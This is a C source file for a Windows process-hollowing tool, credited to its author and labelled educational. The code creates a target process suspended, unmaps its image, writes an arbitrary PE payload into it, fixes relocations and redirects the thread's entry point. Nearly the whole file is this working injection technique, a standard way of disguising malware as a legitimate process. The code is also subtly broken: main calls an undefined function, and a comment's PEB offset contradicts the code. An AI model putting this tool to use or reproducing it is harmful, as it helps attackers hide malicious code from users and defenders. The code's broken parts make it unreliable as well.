//Tool Written By B4shCr00k For Educational Purposes Only
#include <stdio.h>
#include <windows.h>
#include <winternl.h>



#define PAGE_SIZE 0x1000
//ntdll functions declaration 
#define ProcessBasicInformation 0
typedef NTSTATUS(WINAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
NtUnmapViewOfSection_t NtUnmapViewOfSection = NULL;
//PE headers we will need later
IMAGE_DOS_HEADER *dosHeader;
IMAGE_NT_HEADERS32 *ntHeader;
IMAGE_SECTION_HEADER* sectionHeader;
IMAGE_BASE_RELOCATION *baseReloc;


typedef struct unmapndheader {
    PIMAGE_NT_HEADERS32 ntHeader;
    BYTE* NewAllocatedSpace;
}unmapndheader;

//struct needed to read the peb
typedef struct __PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} _PROCESS_BASIC_INFORMATION;
//function that reads the injected pe into the current process
BYTE* ReadPEIntoCurrentProcess(char *path)
{
    FILE* pe;
    long size;
    BYTE *inMemoryBase;
    pe = fopen(path, "rb");
    if (pe == NULL)
    {
        printf("[-] Failed To Open File\n");
    }
    else
    {
        printf("[+] File Opened\n");
    }
    fseek(pe, 0, SEEK_END);
    size = ftell(pe);
    if (size < PAGE_SIZE)
    {
        printf("[-] Invalid Pe File\n");
    }
    fseek(pe, 0, SEEK_SET);
    inMemoryBase = (BYTE*)malloc(size * sizeof(BYTE));
    
    if (fread(inMemoryBase, 1, size, pe) < size)
    {
        printf("[-] Failed To Read The File Into Current Process\n");
    }
    else
    {
        printf("[+] File Read Into Current Process at 0x%p\n", inMemoryBase);
    }

    fclose(pe);
    return inMemoryBase;

}
//writes the pe we wanna inject into the target process after unmapping it
unmapndheader writePe(BYTE* imageBase,BYTE* unmappedAddress,PROCESS_INFORMATION pi)
{
    dosHeader = (IMAGE_DOS_HEADER*)imageBase;
    if (dosHeader->e_magic != 0x5a4d)
    {
        printf("[-] Failed To Find Dos Header\n");
    }
    else
    {
        printf("[+] Dos Header Found \n");

    }
    ntHeader = (IMAGE_NT_HEADERS32*)(imageBase + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("[-] Failed To Find Nt Header\n");
    }
    else
    {
        printf("[+] Nt Header Found\n");
    }
    printf("[+] Trying To Allocate Space Inside The Hollowed Process At 0x%p\n", unmappedAddress);
    BYTE* NewAddress = VirtualAllocEx(pi.hProcess, unmappedAddress, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


    if (!NewAddress) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        
    }
    else
    {
        printf("[+] Allocated Space In The Unmapped Section At 0x%p\n", NewAddress);
    }
    if (!WriteProcessMemory(pi.hProcess, NewAddress, imageBase, ntHeader->OptionalHeader.SizeOfHeaders, NULL))
    {
        printf("[-] Failed To Write Headers Into Hollowed Process\n");
    }
    else
    {
        printf("[+] Headers Written Into Hollowed Process At 0x%p\n",NewAddress);
    }
    sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
    printf("[!] Now Writing Sections Into Hollowed Process\n");
    for ( int i = 0; i != ntHeader->FileHeader.NumberOfSections; i++,sectionHeader++)
    {
        if (!WriteProcessMemory(pi.hProcess, NewAddress + sectionHeader->VirtualAddress, imageBase + sectionHeader->PointerToRawData,sectionHeader->SizeOfRawData,NULL))
        {
            printf("[-] Failed To Write Section %d Into Hollowed Process\n", i);
        }
        else
        {
            printf("---- Section %s Written Into Hollowed Process At 0x%p\n", sectionHeader->Name, sectionHeader->VirtualAddress + NewAddress);
        }
    
    }
    printf("[+] Sections Written Into Hollowed Process\n");
    unmapndheader ntheaderandnewaddress;
    ntheaderandnewaddress.NewAllocatedSpace = NewAddress;
    ntheaderandnewaddress.ntHeader = ntHeader;
    return ntheaderandnewaddress;
}
//Preform Base Relocations If needed
void BaseRelocations(BYTE* BaseAddress, PROCESS_INFORMATION pi, PIMAGE_NT_HEADERS32 ntHeader) {
    DWORD relocDirSize = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    if (!relocDirSize) return;

    DWORD relocRVA = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD Delta = (DWORD)(BaseAddress - ntHeader->OptionalHeader.ImageBase);
    printf("[+] Delta is %d \n", Delta);
    if (Delta == 0) {
        printf("[+] No Relocations Needed Delta Is 0\n");
        return;
    }
    printf("[+] Base Relocations Needed (Delta Ain't 0)\n");

    
    DWORD bytesRead;
    IMAGE_BASE_RELOCATION* relocData = (IMAGE_BASE_RELOCATION*)malloc(relocDirSize);
    if (!ReadProcessMemory(pi.hProcess, BaseAddress + relocRVA, relocData, relocDirSize, &bytesRead) || bytesRead != relocDirSize) {
        printf("[-] Failed to read relocation data\n");
        free(relocData);
        return;
    }

    IMAGE_BASE_RELOCATION* currentBlock = relocData;
    while ((DWORD)currentBlock < (DWORD)relocData + relocDirSize && currentBlock->SizeOfBlock) {
        DWORD entriesCount = (currentBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries = (WORD*)(currentBlock + 1);

        for (DWORD i = 0; i < entriesCount; i++) {
            if (entries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                DWORD rva = currentBlock->VirtualAddress + (entries[i] & 0xFFF);
                DWORD value;

                
                if (!ReadProcessMemory(pi.hProcess, BaseAddress + rva, &value, sizeof(DWORD), NULL)) {
                    printf("[-] Failed to read relocation target\n");
                    continue;
                }

                
                value += Delta;

               
                if (!WriteProcessMemory(pi.hProcess, BaseAddress + rva, &value, sizeof(DWORD), NULL)) {
                    printf("[-] Failed to write relocation\n");
                }
            }
        }

        currentBlock = (IMAGE_BASE_RELOCATION*)((BYTE*)currentBlock + currentBlock->SizeOfBlock);
    }

    free(relocData);
}
//Create Process In A Suspended State
PROCESS_INFORMATION ProcessCreate(char* Path)
{
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    if (!CreateProcessA(Path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessA failed: %lu\n", GetLastError());

    }
    else
    {
        printf("[+] Process Created In A Suspended State PID : (%lu) \n", pi.dwProcessId);
        
        return pi;
    }
}

// Loads ntdll 
HMODULE ResolveNtDllFunctions()
{
    HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
    if (hNtDll)
    {
        printf("[+] Got Handle To NtDll\n");
        return hNtDll;
    }
    else
    {
        printf("[-] Failed To Get Handle To NtDll\n");
    }

}
//Parse The Peb to get the image base address
BYTE* GetBaseImageAddress(HANDLE hProcess, HMODULE hNtDll)
{
    _PROCESS_BASIC_INFORMATION pbi;
    PVOID baseAddress = NULL;

    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        printf("[-] Failed To Get NtQueryInformationProcess Address\n");
        return NULL;
    }

    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    if (status != 0) {
        printf("[-] Failed To Retrieve Process Infos (NTSTATUS: 0x%X)\n", status);
        return NULL;
    }

    printf("[+] Process Infos Retrieved\n");
    if (!pbi.PebBaseAddress) {
        printf("[-] PEB Base Address is NULL\n");
        return NULL;
    }
    // Read remote PEB.ImageBaseAddress at offset 0x10
    if (!ReadProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + 0x08, &baseAddress, sizeof(PVOID), NULL)) {
        printf("[-] Failed to read ImageBaseAddress from target PEB\n");
        return NULL;
    }
    printf("[+] Base Address Is 0x%p\n", baseAddress);
    
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQueryEx(hProcess, baseAddress, &mbi, sizeof(mbi)) != 0) {
        printf("[+] Region base: 0x%p | Size: 0x%lx | State: 0x%lx | Protect: 0x%lx\n",
            mbi.BaseAddress, mbi.RegionSize, mbi.State, mbi.Protect);
    }
    else {
        printf("[-] VirtualQueryEx failed: %lu\n", GetLastError());
    }
    
    return baseAddress;
}


//unmaps the image base address found previously
void UnmapTargetMemory(HANDLE hProcess, BYTE* baseAddress,HMODULE hNtDll) {
    
    NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtDll, "NtUnmapViewOfSection");
       
    

    
    if (NtUnmapViewOfSection) {
        printf("[+] Trying To Unmap 0x%p\n", baseAddress);
        NTSTATUS status = NtUnmapViewOfSection(hProcess, baseAddress);
        if (status == 0) {
            printf("[+] Memory successfully unmapped.\n");
        }
        else {
            printf("[-] Failed to unmap memory, status: %ld\n", status);
        }
    }
    else {
        printf("[-] Could not get address of NtUnmapViewOfSection.\n");
    }
}

//changes the eip reg into the new entry point then resumes the thread
int fixthread(PROCESS_INFORMATION pi, BYTE* remoteBase, PIMAGE_NT_HEADERS32 ntHeader) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] GetThreadContext failed: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Original EIP: 0x%08lx\n", ctx.Eip);
    printf("[+] Address Of Entry Point 0x%p\n", ntHeader->OptionalHeader.AddressOfEntryPoint);
    // Update EIP to new entry point
    ctx.Eip = (DWORD_PTR)(remoteBase + ntHeader->OptionalHeader.AddressOfEntryPoint);

    // Some PEs expect EAX to hold the entry point
    ctx.Eax = remoteBase;
    

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[-] SetThreadContext failed: %lu\n", GetLastError());
        return -1;
    }

    printf("[+] Thread context updated. New EIP: 0x%08X\n", ctx.Eip);
    getchar();
    // Resuming the thread after updating the context
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("[-] Failed to resume thread: %lu\n", GetLastError());
        return -1;
    }
    printf("[+] Thread resumed successfully.\n");

    return 0;
}



int main()
{
    
    PROCESS_INFORMATION pi = { 0 };
    const char* targetPath = "~ENTER THE TARGET PATH HERE (USE // OR YOUL GET AN ERROR)";
    const char* pePath = "~ENTER THE INJECTED PE PATH HERE(USE // OR YOUL GET AN ERROR)";
    printf("-------------Tool Made By B4shCr00k");
    BYTE* inProcessBaseAddress = ReadPEIntoCurrentProcess(pePath);
    pi = ProcessCreate(targetPath);
    HMODULE hNtDll = ResolveNtDllFunctions();
    BYTE* unmappedAddress = GetBaseImageAddress(pi.hProcess,hNtDll);
    UnmapTargetMemory(pi.hProcess,unmappedAddress,hNtDll);
    unmapndheader unmapndheader = writePe(inProcessBaseAddress, unmappedAddress, pi);
    BaseRelocations(unmapndheader.NewAllocatedSpace,pi,ntHeader);
    WriteToProcess(pi, unmapndheader.NewAllocatedSpace,ntHeader);

    //cleanup 
    CloseHandle(pi.hProcess);   
    free(inProcessBaseAddress);
    

    return 0;

}
